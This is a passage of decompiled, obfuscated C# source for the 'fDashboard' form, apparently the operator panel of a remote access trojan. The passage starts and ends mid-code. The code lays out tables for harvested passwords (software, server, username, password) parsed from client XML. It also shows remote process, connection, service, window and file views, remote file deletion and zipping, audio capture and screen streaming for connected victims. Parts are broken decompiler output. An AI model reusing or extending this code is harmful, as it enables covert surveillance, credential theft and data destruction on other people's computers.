	public static extern long FindWindowW([MarshalAs(UnmanagedType.LPTStr)] string string_12, [MarshalAs(UnmanagedType.LPTStr)] string string_13);

	// Token: 0x06000852 RID: 2130
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr intptr_0, int int_6);

	// Token: 0x06000853 RID: 2131
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool MoveWindow(int int_6, long long_1, long long_2, long long_3, long long_4, bool bool_3);

	// Token: 0x06000854 RID: 2132
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int SetParent(IntPtr intptr_0, IntPtr intptr_1);

	// Token: 0x06000855 RID: 2133
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int SendMessage(IntPtr intptr_0, int int_6, int int_7, int int_8);

	// Token: 0x06000856 RID: 2134
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetSystemMenu(long long_1, long long_2);

	// Token: 0x06000857 RID: 2135
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long DrawMenuBar(long long_1);

	// Token: 0x06000858 RID: 2136
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long RemoveMenu(long long_1, long long_2, long long_3);

	// Token: 0x06000859 RID: 2137 RVA: 0x00006728 File Offset: 0x00004928
	public void method_0()
	{
		this.object_0 = true;
		this.string_9 = "# [DISCONNECTED] " + this.string_6;
		this.vmethod_774().RunWorkerAsync();
	}

	// Token: 0x0600085A RID: 2138 RVA: 0x000395D0 File Offset: 0x000377D0
	private void fDashboard_Load(object sender, EventArgs e)
	{
		this.method_147();
		base.Width = 1024;
		base.Height = 600;
		checked
		{
			this.vmethod_18().Width = base.Width - 2;
			this.vmethod_18().Height = base.Height - this.vmethod_18().Top - 30;
			this.method_80();
			this.vmethod_156().BackColor = Color.FromArgb(26, this.vmethod_156().BackColor);
			this.vmethod_162().Left = (int)Math.Round(unchecked((double)this.vmethod_156().Width / 2.0 - (double)this.vmethod_162().Width / 2.0));
			this.vmethod_204().BackColor = Color.FromArgb(26, this.vmethod_204().BackColor);
			this.vmethod_204().Location = this.vmethod_156().Location;
			this.vmethod_472().Value = 0;
			this.vmethod_472().Left = (int)Math.Round(unchecked((double)this.vmethod_720().Left + (double)this.vmethod_720().Width / 2.0 - (double)this.vmethod_472().Width / 2.0));
			this.vmethod_472().Top = (int)Math.Round(unchecked((double)this.vmethod_720().Top + (double)this.vmethod_720().Height / 2.0 - (double)this.vmethod_472().Height / 2.0));
			this.vmethod_474().Left = this.vmethod_472().Left;
			this.vmethod_474().Top = this.vmethod_472().Top;
			this.vmethod_472().ShowText = true;
			this.vmethod_752().Value = 0;
			this.vmethod_752().Left = (int)Math.Round(unchecked((double)this.vmethod_750().Left + (double)this.vmethod_750().Width / 2.0 - (double)this.vmethod_752().Width / 2.0));
			this.vmethod_752().Top = (int)Math.Round(unchecked((double)this.vmethod_750().Top + (double)this.vmethod_750().Height / 2.0 - (double)this.vmethod_752().Height / 2.0));
			this.vmethod_754().Left = this.vmethod_752().Left;
			this.vmethod_754().Top = this.vmethod_752().Top;
			this.vmethod_752().ShowText = true;
			this.vmethod_120().Value = 0;
			this.vmethod_120().Left = (int)Math.Round(unchecked((double)this.vmethod_78().Left + (double)this.vmethod_78().Width / 2.0 - (double)this.vmethod_120().Width / 2.0));
			this.vmethod_120().Top = (int)Math.Round(unchecked((double)this.vmethod_78().Top + (double)this.vmethod_78().Height / 2.0 - (double)this.vmethod_120().Height / 2.0));
			this.vmethod_508().Left = this.vmethod_120().Left;
			this.vmethod_508().Top = this.vmethod_120().Top;
			this.vmethod_120().ShowText = true;
			this.vmethod_576().Left = (int)Math.Round(unchecked((double)this.vmethod_578().Left + (double)this.vmethod_578().Width / 2.0 - (double)this.vmethod_576().Width / 2.0));
			this.vmethod_576().Top = (int)Math.Round(unchecked((double)this.vmethod_578().Top + (double)this.vmethod_578().Height / 2.0 - (double)this.vmethod_576().Height / 2.0));
			this.vmethod_566().Left = this.vmethod_576().Left;
			this.vmethod_566().Top = this.vmethod_576().Top;
			this.vmethod_576().ShowText = true;
			this.vmethod_622().Left = (int)Math.Round(unchecked((double)this.vmethod_624().Left + (double)this.vmethod_624().Width / 2.0 - (double)this.vmethod_622().Width / 2.0));
			this.vmethod_622().Top = (int)Math.Round(unchecked((double)this.vmethod_624().Top + (double)this.vmethod_624().Height / 2.0 - (double)this.vmethod_622().Height / 2.0));
			this.vmethod_614().Left = this.vmethod_622().Left;
			this.vmethod_614().Top = this.vmethod_622().Top;
			this.vmethod_622().ShowText = true;
			this.vmethod_364().Value = 0;
			this.vmethod_364().Left = (int)Math.Round(unchecked((double)this.vmethod_718().Left + (double)this.vmethod_718().Width / 2.0 - (double)this.vmethod_364().Width / 2.0));
			this.vmethod_364().Top = (int)Math.Round(unchecked((double)this.vmethod_718().Top + (double)this.vmethod_718().Height / 2.0 - (double)this.vmethod_364().Height / 2.0));
			this.vmethod_364().ShowText = true;
			this.vmethod_512().Left = this.vmethod_364().Left;
			this.vmethod_512().Top = this.vmethod_364().Top;
			this.vmethod_548().Value = 0;
			this.vmethod_548().Left = (int)Math.Round(unchecked((double)this.vmethod_550().Left + (double)this.vmethod_550().Width / 2.0 - (double)this.vmethod_548().Width / 2.0));
			this.vmethod_548().Top = (int)Math.Round(unchecked((double)this.vmethod_550().Top + (double)this.vmethod_550().Height / 2.0 - (double)this.vmethod_548().Height / 2.0));
			this.vmethod_548().ShowText = true;
			this.vmethod_546().Left = this.vmethod_548().Left;
			this.vmethod_546().Top = this.vmethod_548().Top;
			this.vmethod_290().Left = (int)Math.Round(unchecked((double)this.vmethod_280().Left + (double)this.vmethod_280().Width / 2.0 - (double)this.vmethod_290().Width / 2.0));
			this.vmethod_290().Top = (int)Math.Round(unchecked((double)this.vmethod_280().Top + (double)this.vmethod_280().Height / 2.0 - (double)this.vmethod_290().Height / 2.0));
			this.vmethod_556().Left = this.vmethod_290().Left;
			this.vmethod_556().Top = this.vmethod_290().Top;
			this.vmethod_552().Columns.Add("oVAL1", string.Empty);
			this.vmethod_552().Columns.Add("oVAL2", string.Empty);
			this.vmethod_552().Columns[0].Width = 300;
			this.vmethod_552().Columns[1].Width = this.vmethod_552().Width - this.vmethod_552().Columns[0].Width - 6;
			this.vmethod_554().Left = (int)Math.Round(unchecked((double)this.vmethod_552().Left + (double)this.vmethod_552().Width / 2.0 - (double)this.vmethod_554().Width / 2.0));
			this.vmethod_554().Top = (int)Math.Round(unchecked((double)this.vmethod_552().Top + (double)this.vmethod_552().Height / 2.0 - (double)this.vmethod_554().Height / 2.0));
			this.vmethod_550().Columns.Add("Application");
			this.vmethod_550().Columns.Add("Location");
			this.vmethod_550().Columns.Add("Publisher");
			this.vmethod_550().Columns.Add("Installed on");
			this.vmethod_550().Columns.Add("Size");
			this.vmethod_550().Columns.Add("Version");
			this.vmethod_550().Columns.Add("Silent uninstall");
			this.vmethod_550().Columns[0].Width = 220;
			this.vmethod_550().Columns[1].Width = 220;
			this.vmethod_550().Columns[2].Width = 160;
			this.vmethod_550().Columns[3].Width = 80;
			this.vmethod_550().Columns[4].Width = 80;
			this.vmethod_550().Columns[5].Width = 100;
			this.vmethod_550().Columns[6].Width = 80;
			this.vmethod_418().Columns.Add("Type");
			this.vmethod_418().Columns.Add("Software");
			this.vmethod_418().Columns.Add("Server");
			this.vmethod_418().Columns.Add("Username");
			this.vmethod_418().Columns.Add("Password");
			this.vmethod_418().Columns[0].Width = (int)Math.Round(unchecked((double)this.vmethod_418().Width / 5.0 - 10.0));
			this.vmethod_418().Columns[1].Width = (int)Math.Round(unchecked((double)this.vmethod_418().Width / 5.0 - 10.0));
			this.vmethod_418().Columns[2].Width = (int)Math.Round(unchecked((double)this.vmethod_418().Width / 5.0 - 10.0));
			this.vmethod_418().Columns[3].Width = (int)Math.Round(unchecked((double)this.vmethod_418().Width / 5.0 - 10.0));
			this.vmethod_418().Columns[4].Width = (int)Math.Round(unchecked((double)this.vmethod_418().Width / 5.0 - 10.0));
			this.vmethod_78().Columns.Add("Name");
			this.vmethod_78().Columns.Add("Description");
			this.vmethod_78().Columns.Add("Path");
			this.vmethod_78().Columns.Add("PID");
			this.vmethod_78().Columns.Add("Threads");
			this.vmethod_78().Columns.Add("Memory");
			this.vmethod_78().Columns.Add("Priority");
			this.vmethod_78().Columns[0].Width = 140;
			this.vmethod_78().Columns[1].Width = 160;
			this.vmethod_78().Columns[2].Width = 340;
			this.vmethod_78().Columns[3].Width = 80;
			this.vmethod_78().Columns[4].Width = 80;
			this.vmethod_78().Columns[5].Width = 80;
			this.vmethod_78().Columns[6].Width = 80;
			this.vmethod_718().Columns.Add("Process");
			this.vmethod_718().Columns.Add("PID");
			this.vmethod_718().Columns.Add("Protocol");
			this.vmethod_718().Columns.Add("Local address");
			this.vmethod_718().Columns.Add("Local port");
			this.vmethod_718().Columns.Add("Remote address");
			this.vmethod_718().Columns.Add("Remote port");
			this.vmethod_718().Columns.Add("State");
			this.vmethod_718().Columns[0].Width = 180;
			this.vmethod_718().Columns[1].Width = 80;
			this.vmethod_718().Columns[2].Width = 100;
			this.vmethod_718().Columns[3].Width = 140;
			this.vmethod_718().Columns[4].Width = 80;
			this.vmethod_718().Columns[5].Width = 140;
			this.vmethod_718().Columns[6].Width = 80;
			this.vmethod_718().Columns[7].Width = 140;
			this.vmethod_578().Columns.Add("Name");
			this.vmethod_578().Columns.Add("Display name");
			this.vmethod_578().Columns.Add("PID");
			this.vmethod_578().Columns.Add("Status");
			this.vmethod_578().Columns.Add("Startup type");
			this.vmethod_578().Columns.Add("Type");
			this.vmethod_578().Columns.Add("Error control");
			this.vmethod_578().Columns.Add("Path");
			this.vmethod_578().Columns.Add("Dependencies");
			this.vmethod_578().Columns[0].Width = 120;
			this.vmethod_578().Columns[1].Width = 160;
			this.vmethod_578().Columns[2].Width = 50;
			this.vmethod_578().Columns[3].Width = 90;
			this.vmethod_578().Columns[4].Width = 90;
			this.vmethod_578().Columns[5].Width = 100;
			this.vmethod_578().Columns[6].Width = 100;
			this.vmethod_578().Columns[7].Width = 180;
			this.vmethod_578().Columns[8].Width = 80;
			this.vmethod_624().Columns.Add("Title");
			this.vmethod_624().Columns.Add("Class");
			this.vmethod_624().Columns.Add("Hwnd");
			this.vmethod_624().Columns.Add("Size");
			this.vmethod_624().Columns.Add("State");
			this.vmethod_624().Columns[0].Width = 360;
			this.vmethod_624().Columns[1].Width = 300;
			this.vmethod_624().Columns[2].Width = 100;
			this.vmethod_624().Columns[3].Width = 100;
			this.vmethod_624().Columns[4].Width = 100;
			this.vmethod_720().Columns.Add("Name");
			this.vmethod_720().Columns.Add("Description");
			this.vmethod_720().Columns.Add("Type");
			this.vmethod_720().Columns.Add("Size");
			this.vmethod_720().Columns.Add("Attributes");
			this.vmethod_720().Columns.Add("Last modified");
			this.vmethod_720().Columns[0].Width = 140;
			this.vmethod_720().Columns[1].Width = 160;
			this.vmethod_720().Columns[2].Width = 120;
			this.vmethod_720().Columns[3].Width = 80;
			this.vmethod_720().Columns[4].Width = 80;
			this.vmethod_720().Columns[5].Width = 140;
			this.vmethod_76().Columns.Add(string.Empty);
			this.vmethod_76().Columns[0].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);
			this.vmethod_76().Columns[0].Width = this.vmethod_76().Width - 6 - SystemInformation.VerticalScrollBarWidth;
			Class130.ShowScrollBar(this.vmethod_76().Handle, 1, true);
			this.vmethod_750().Columns.Add("Name");
			this.vmethod_750().Columns.Add("Type");
			this.vmethod_750().Columns.Add("Data");
			this.vmethod_750().Columns[0].Width = 180;
			this.vmethod_750().Columns[1].Width = 140;
			this.vmethod_750().Columns[2].Width = 400;
			this.vmethod_748().Columns.Add("Name");
			this.vmethod_748().Columns[0].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);
			this.vmethod_748().Columns[0].Width = this.vmethod_748().Width - 6 - SystemInformation.VerticalScrollBarWidth;
			Class130.ShowScrollBar(this.vmethod_748().Handle, 1, true);
			this.vmethod_388().Columns.Add("Date");
			this.vmethod_388().Columns.Add("Size");
			this.vmethod_388().Columns[0].Width = 80;
			this.vmethod_388().Columns[1].Width = this.vmethod_388().Width - this.vmethod_388().Columns[0].Width - 6 - SystemInformation.VerticalScrollBarWidth;
			this.vmethod_316().Columns.Add("Name");
			this.vmethod_316().Columns.Add("Size");
			this.vmethod_316().Columns.Add("Duration");
			this.vmethod_316().Columns.Add("Sample rate");
			this.vmethod_316().Columns.Add("Channels");
			this.vmethod_316().Columns.Add("Bits per sample");
			this.vmethod_316().Columns.Add("Block align");
			this.vmethod_316().Columns.Add("Audio format");
			this.vmethod_316().Columns[0].Width = 160;
			this.vmethod_316().Columns[1].Width = 100;
			this.vmethod_316().Columns[2].Width = 120;
			this.vmethod_316().Columns[3].Width = 100;
			this.vmethod_316().Columns[4].Width = 100;
			this.vmethod_316().Columns[5].Width = 100;
			this.vmethod_316().Columns[6].Width = 100;
			this.vmethod_316().Columns[7].Width = 100;
			int num = 10;
			do
			{
				this.vmethod_82().Items.Add(Conversions.ToString(num) + "%");
				num += 10;
			}
			while (num <= 100);
			this.vmethod_82().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_82().Items[9]);
			int num2 = 1;
			do
			{
				this.vmethod_320().Items.Add(num2);
				num2++;
			}
			while (num2 <= 10);
			this.vmethod_320().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_320().Items[1]);
			this.vmethod_304().Items.Add(8000);
			this.vmethod_304().Items.Add(11025);
			this.vmethod_304().Items.Add(22050);
			this.vmethod_304().Items.Add(44100);
			this.vmethod_304().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_304().Items[0]);
			this.vmethod_466().ReadOnly = true;
			this.vmethod_466().BackColor = Color.White;
			this.gclass9_0 = new GClass9();
			this.vmethod_388().ListViewItemSorter = this.gclass9_0;
			this.vmethod_316().GridLines = Class135.smethod_0().Gridlines;
			this.vmethod_718().GridLines = Class135.smethod_0().Gridlines;
			this.vmethod_418().GridLines = Class135.smethod_0().Gridlines;
			this.vmethod_76().GridLines = Class135.smethod_0().Gridlines;
			this.vmethod_720().GridLines = Class135.smethod_0().Gridlines;
			this.vmethod_552().GridLines = Class135.smethod_0().Gridlines;
			this.vmethod_388().GridLines = Class135.smethod_0().Gridlines;
			this.vmethod_78().GridLines = Class135.smethod_0().Gridlines;
			this.vmethod_578().GridLines = Class135.smethod_0().Gridlines;
			this.vmethod_550().GridLines = Class135.smethod_0().Gridlines;
			this.vmethod_624().GridLines = Class135.smethod_0().Gridlines;
		}
	}

	// Token: 0x0600085B RID: 2139 RVA: 0x0003AD78 File Offset: 0x00038F78
	public void method_1(ref GClass1 gclass1_1, ref string string_12, ref string string_13, ref string string_14, ref string string_15, ref string string_16)
	{
		this.Text = string.Concat(new string[]
		{
			string_12,
			":",
			string_13,
			"^",
			string_14,
			" [",
			string_15,
			"]"
		});
		this.string_6 = this.Text;
		base.Visible = true;
		this.gclass1_0 = gclass1_1;
		this.string_0 = string_12;
		this.string_1 = string_13;
		this.string_2 = string_14;
		this.string_3 = string_15;
		this.string_4 = this.gclass1_0.string_0;
		this.string_5 = string_16;
		if (Class130.concurrentDictionary_3[this.string_4].IS_SSL)
		{
			this.vmethod_456().Text = "Connection encrypted";
		}
		else
		{
			this.vmethod_456().Text = "Connection rerouted";
		}
		this.vmethod_456().Image = Class130.concurrentDictionary_3[this.string_4].ICO_TYPE;
		this.vmethod_552().Enabled = false;
		this.vmethod_554().BringToFront();
		this.vmethod_554().Visible = true;
		if (Class130.concurrentDictionary_3[this.string_4].pending_dc)
		{
			this.method_0();
			return;
		}
		string text = this.string_4;
		string text2 = "info|1";
		string text3 = text;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600085C RID: 2140 RVA: 0x0003AF38 File Offset: 0x00039138
	public void method_2(ref string string_12)
	{
		int num;
		int num4;
		object obj2;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_08:
			int num2 = 2;
			if (!this.vmethod_418().InvokeRequired)
			{
				goto IL_41;
			}
			IL_17:
			num2 = 3;
			this.vmethod_418().Invoke(new fDashboard.Delegate6(this.method_2), new object[]
			{
				string_12
			});
			goto IL_1C1;
			IL_41:
			num2 = 5;
			string_12 = Strings.Replace(string_12, "&", "&amp;", 1, -1, CompareMethod.Text);
			IL_59:
			num2 = 6;
			if (Operators.CompareString(string_12.Substring(checked(string_12.Length - 46)), "</app_password>\r\n</app_password_list>\r\n</root>", true) == 0)
			{
				goto IL_89;
			}
			IL_79:
			num2 = 7;
			string_12 += "</app_password>\r\n</app_password_list>\r\n</root>";
			IL_89:
			num2 = 8;
			XmlDocument xmlDocument = new XmlDocument();
			IL_92:
			num2 = 9;
			xmlDocument.LoadXml(string_12);
			IL_9E:
			num2 = 10;
			XmlNodeList xmlNodeList = xmlDocument.SelectNodes("/root/app_password_list/app_password");
			IL_AF:
			num2 = 11;
			this.vmethod_418().Items.Clear();
			IL_C2:
			num2 = 12;
			IEnumerator enumerator = xmlNodeList.GetEnumerator();
			while (enumerator.MoveNext())
			{
				object obj = enumerator.Current;
				XmlNode xmlNode = (XmlNode)obj;
				IL_DE:
				num2 = 13;
				this.vmethod_418().Items.Add(new ListViewItem(new string[]
				{
					xmlNode.ChildNodes.Item(0).InnerText,
					xmlNode.ChildNodes.Item(1).InnerText,
					xmlNode.ChildNodes.Item(2).InnerText,
					xmlNode.ChildNodes.Item(3).InnerText,
					xmlNode.ChildNodes.Item(4).InnerText
				}));
				IL_161:
				num2 = 14;
			}
			IL_16F:
			num2 = 15;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
			IL_185:
			num2 = 16;
			this.vmethod_470().Text = "Logins: " + Conversions.ToString(this.vmethod_418().Items.Count);
			IL_1B2:
			num2 = 17;
			this.vmethod_418().Enabled = true;
			IL_1C1:
			goto IL_25D;
			IL_1C6:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_21C:
			goto IL_252;
			IL_21E:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_22F:;
		}
		catch when (endfilter(obj2 is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj3;
			goto IL_21E;
		}
		IL_252:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_25D:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x0600085D RID: 2141 RVA: 0x0003B1C8 File Offset: 0x000393C8
	public void method_3(ref string string_12)
	{
		this.imageList_1 = new ImageList
		{
			ImageSize = new Size(24, 20)
		};
		this.imageList_2 = new ImageList
		{
			ImageSize = new Size(128, 128)
		};
		if (this.vmethod_454().InvokeRequired)
		{
			this.vmethod_454().Invoke(new fDashboard.Delegate2(this.method_3), new object[]
			{
				string_12
			});
			return;
		}
		this.vmethod_474().SendToBack();
		this.vmethod_474().Visible = false;
		this.vmethod_454().Items.Clear();
		checked
		{
			List<JToken> list = JObject.Parse(string_12.Substring(7, string_12.Length - 8))["block"].ToList<JToken>();
			int selectedIndex = 0;
			try
			{
				foreach (JToken jtoken in list)
				{
					int num;
					try
					{
						string text = jtoken["letter"].ToString();
						jtoken["label"].ToString();
						string text2 = jtoken["type"].ToString();
						string text3 = jtoken["filesystem"].ToString();
						string text4 = jtoken["sizetotal"].ToString();
						string text5 = jtoken["sizefree"].ToString();
						string text6 = jtoken["sizeused"].ToString();
						string s = jtoken["icon"].ToString();
						if (Operators.CompareString(jtoken["issys"].ToString(), "1", true) == 0)
						{
							selectedIndex = num;
						}
						byte[] array = Convert.FromBase64String(s);
						Image image = Class136.smethod_18(ref array);
						this.imageList_1.Images.Add(string.Concat(new string[]
						{
							text2,
							" ",
							text,
							" [",
							text6,
							" / ",
							text4,
							" - Free: ",
							text5,
							"][",
							text3,
							"]"
						}), image);
						fDashboard.Class127 item = new fDashboard.Class127(string.Concat(new string[]
						{
							text2,
							" ",
							text,
							" [",
							text6,
							" / ",
							text4,
							" - Free: ",
							text5,
							"][",
							text3,
							"]"
						}), image);
						this.vmethod_454().Items.Add(item);
					}
					catch (Exception ex)
					{
					}
					num++;
					Application.DoEvents();
				}
			}
			finally
			{
				List<JToken>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			this.collection_1.Clear();
			this.vmethod_696().Enabled = true;
			this.vmethod_446().Enabled = false;
			this.vmethod_448().Enabled = false;
			if (this.vmethod_454().Items.Count > 0)
			{
				this.vmethod_454().SelectedIndex = selectedIndex;
				this.vmethod_76().Enabled = true;
				this.vmethod_720().Enabled = true;
			}
		}
	}

	// Token: 0x0600085E RID: 2142 RVA: 0x0003B518 File Offset: 0x00039718
	public void method_4(ref long long_1, ref string string_12)
	{
		if (this.vmethod_720().InvokeRequired)
		{
			this.vmethod_720().Invoke(new fDashboard.Delegate18(this.method_4), new object[]
			{
				long_1,
				string_12
			});
			return;
		}
		string left = string_12;
		if (Operators.CompareString(left, "-1", true) == 0)
		{
			this.vmethod_208().ForeColor = Color.Red;
			this.vmethod_208().Text = "Delete operation failed!";
			this.vmethod_698().Enabled = true;
			this.vmethod_214().Value = 0;
			this.vmethod_206().Text = "0/" + Conversions.ToString(this.vmethod_214().Maximum);
			this.vmethod_170().Enabled = true;
			this.vmethod_174().Enabled = true;
			this.vmethod_146().Enabled = true;
			this.vmethod_218().Enabled = true;
			return;
		}
		if (Operators.CompareString(left, "0", true) == 0)
		{
			checked
			{
				if (this.vmethod_156().Visible)
				{
					this.vmethod_204().Top = this.vmethod_156().Top - this.vmethod_156().Height - 10;
				}
				this.vmethod_204().Visible = true;
				if (long_1 > 0L)
				{
					this.vmethod_214().Maximum = (int)long_1;
					this.vmethod_214().Minimum = 0;
					this.vmethod_208().ForeColor = Color.Black;
					this.vmethod_698().Enabled = false;
					this.vmethod_214().Value = 0;
					this.vmethod_206().Text = "0/" + Conversions.ToString(this.vmethod_214().Maximum);
					return;
				}
				this.vmethod_214().Minimum = -1;
				this.vmethod_214().Maximum = 0;
				this.vmethod_208().ForeColor = Color.Red;
				this.vmethod_208().Text = "No files to be deleted!";
				this.vmethod_698().Enabled = true;
				this.vmethod_206().Text = "0/0";
				this.vmethod_170().Enabled = true;
				this.vmethod_174().Enabled = true;
				this.vmethod_146().Enabled = true;
				this.vmethod_218().Enabled = true;
				return;
			}
		}
		else
		{
			if (Operators.CompareString(left, "1", true) == 0)
			{
				this.vmethod_214().Value = this.vmethod_214().Maximum;
				if (long_1 == 0L)
				{
					this.vmethod_208().ForeColor = Color.Red;
					this.vmethod_208().Text = "Operation completed! No files were deleted";
				}
				else if (long_1 > 0L & long_1 < (long)this.vmethod_214().Maximum)
				{
					this.vmethod_208().ForeColor = Color.Blue;
				}
				else
				{
					this.vmethod_208().ForeColor = Color.Green;
				}
				this.vmethod_208().Text = "Operation completed! " + Conversions.ToString(long_1) + " files were deleted";
				this.vmethod_698().Enabled = true;
				this.vmethod_206().Text = Conversions.ToString(long_1) + "/" + Conversions.ToString(this.vmethod_214().Maximum);
				this.vmethod_170().Enabled = true;
				this.vmethod_174().Enabled = true;
				this.vmethod_146().Enabled = true;
				this.vmethod_218().Enabled = true;
				return;
			}
			this.vmethod_208().ForeColor = Color.Black;
			if (long_1 > (long)this.vmethod_214().Maximum)
			{
				long_1 = (long)this.vmethod_214().Maximum;
				this.vmethod_214().Value = this.vmethod_214().Maximum;
				this.vmethod_208().Text = string.Concat(new string[]
				{
					"Deleted ",
					Conversions.ToString(long_1),
					" of ",
					Conversions.ToString(this.vmethod_214().Maximum),
					" files"
				});
				this.vmethod_206().Text = Conversions.ToString(this.vmethod_214().Maximum) + "/" + Conversions.ToString(this.vmethod_214().Maximum);
				return;
			}
			if (long_1 > (long)this.vmethod_214().Value)
			{
				this.vmethod_214().Value = checked((int)long_1);
				this.vmethod_208().Text = "Deleting: " + Strings.Replace(string_12, "/", "\\", 1, -1, CompareMethod.Text);
				this.vmethod_206().Text = Conversions.ToString(long_1) + "/" + Conversions.ToString(this.vmethod_214().Maximum);
			}
			return;
		}
	}

	// Token: 0x0600085F RID: 2143 RVA: 0x0003B9A0 File Offset: 0x00039BA0
	public void method_5(ref long long_1, ref string string_12)
	{
		if (this.vmethod_720().InvokeRequired)
		{
			this.vmethod_720().Invoke(new fDashboard.Delegate14(this.method_5), new object[]
			{
				long_1,
				string_12
			});
			return;
		}
		string left = string_12;
		if (Operators.CompareString(left, "-1", true) == 0)
		{
			this.vmethod_164().ForeColor = Color.Red;
			this.vmethod_164().Text = "ZIP Archive failed!";
			this.vmethod_700().Enabled = true;
			this.vmethod_160().Value = 0;
			this.vmethod_166().Text = "0/" + Conversions.ToString(this.vmethod_160().Maximum);
			this.vmethod_170().Enabled = true;
			this.vmethod_174().Enabled = true;
			return;
		}
		if (Operators.CompareString(left, "0", true) == 0)
		{
			if (this.vmethod_204().Visible)
			{
				this.vmethod_156().Top = checked(this.vmethod_204().Top - this.vmethod_204().Height - 10);
			}
			this.vmethod_164().ForeColor = Color.Black;
			this.vmethod_156().Visible = true;
			this.vmethod_700().Enabled = false;
			this.vmethod_160().Value = 0;
			this.vmethod_160().Maximum = Conversions.ToInteger(Interaction.IIf(long_1 < 1L, 1, long_1));
			this.vmethod_166().Text = "0/" + Conversions.ToString(this.vmethod_160().Maximum);
			return;
		}
		if (Operators.CompareString(left, "1", true) == 0)
		{
			this.vmethod_164().ForeColor = Color.Green;
			this.vmethod_160().Value = this.vmethod_160().Maximum;
			this.vmethod_164().Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("ZIP Archive ", this.vmethod_156().Tag), " successfully created!"));
			this.vmethod_700().Enabled = true;
			this.vmethod_166().Text = Conversions.ToString(this.vmethod_160().Maximum) + "/" + Conversions.ToString(this.vmethod_160().Maximum);
			this.vmethod_170().Enabled = true;
			this.vmethod_174().Enabled = true;
			return;
		}
		this.vmethod_164().ForeColor = Color.Black;
		if (long_1 > (long)this.vmethod_160().Maximum)
		{
			long_1 = (long)this.vmethod_160().Maximum;
			this.vmethod_160().Value = this.vmethod_160().Maximum;
			this.vmethod_164().Text = string.Concat(new string[]
			{
				"Added ",
				Conversions.ToString(long_1),
				" of ",
				Conversions.ToString(this.vmethod_160().Maximum),
				" objects\r\nSaving ZIP Archive, please wait..."
			});
			this.vmethod_166().Text = Conversions.ToString(this.vmethod_160().Maximum) + "/" + Conversions.ToString(this.vmethod_160().Maximum);
			return;
		}
		if (long_1 > (long)this.vmethod_160().Value)
		{
			this.vmethod_160().Value = checked((int)long_1);
			this.vmethod_164().Text = "Compressing: " + Strings.Replace(string_12, "/", "\\", 1, -1, CompareMethod.Text);
			this.vmethod_166().Text = Conversions.ToString(long_1) + "/" + Conversions.ToString(this.vmethod_160().Maximum);
		}
	}

	// Token: 0x06000860 RID: 2144 RVA: 0x0003BD38 File Offset: 0x00039F38
	public void method_6()
	{
		if (this.vmethod_686().InvokeRequired)
		{
			this.vmethod_686().Invoke(new fDashboard.Delegate24(this.method_6), new object[0]);
			return;
		}
		Class130.concurrentDictionary_3[this.string_4].SCREEN_IS_STREAMING = false;
		this.vmethod_686().Text = "Start";
		this.vmethod_686().Enabled = true;
		this.vmethod_246().Enabled = true;
		this.vmethod_88().Enabled = true;
		this.vmethod_86().Enabled = true;
		this.vmethod_246().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_88().Items.Count > 1, true, false));
		this.vmethod_250().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_246().Checked, true, false));
	}

	// Token: 0x06000861 RID: 2145 RVA: 0x0003BE28 File Offset: 0x0003A028
	public void method_7(ref string string_12)
	{
		if (this.vmethod_88().InvokeRequired)
		{
			this.vmethod_88().Invoke(new fDashboard.Delegate19(this.method_7), new object[]
			{
				string_12
			});
			return;
		}
		string[] array = Strings.Split(string_12, ":", -1, CompareMethod.Text);
		this.vmethod_88().Items.Clear();
		this.vmethod_250().Items.Clear();
		this.concurrentStack_0.Clear();
		checked
		{
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				unchecked
				{
					if (array[i].Length > 0)
					{
						string expression = Strings.Split(Strings.Replace(array[i], " [Primary]", string.Empty, 1, -1, CompareMethod.Text), ",", -1, CompareMethod.Text)[2];
						Class130.Struct19 item;
						item.long_0 = (long)Conversions.ToInteger(Strings.Split(expression, "x", -1, CompareMethod.Text)[0]);
						item.long_1 = (long)Conversions.ToInteger(Strings.Split(expression, "x", -1, CompareMethod.Text)[1]);
						this.concurrentStack_0.Push(item);
						this.vmethod_88().Items.Add(Strings.Split(array[i], ",", -1, CompareMethod.Text)[0] + " - " + Strings.Split(array[i], ",", -1, CompareMethod.Text)[2]);
						this.vmethod_250().Items.Add(Strings.Split(array[i], ",", -1, CompareMethod.Text)[0] + " - " + Strings.Split(array[i], ",", -1, CompareMethod.Text)[2]);
					}
				}
			}
			if (this.vmethod_88().Items.Count == 0)
			{
				Interaction.MsgBox("No monitors found!", MsgBoxStyle.Exclamation, Application.ProductName);
				return;
			}
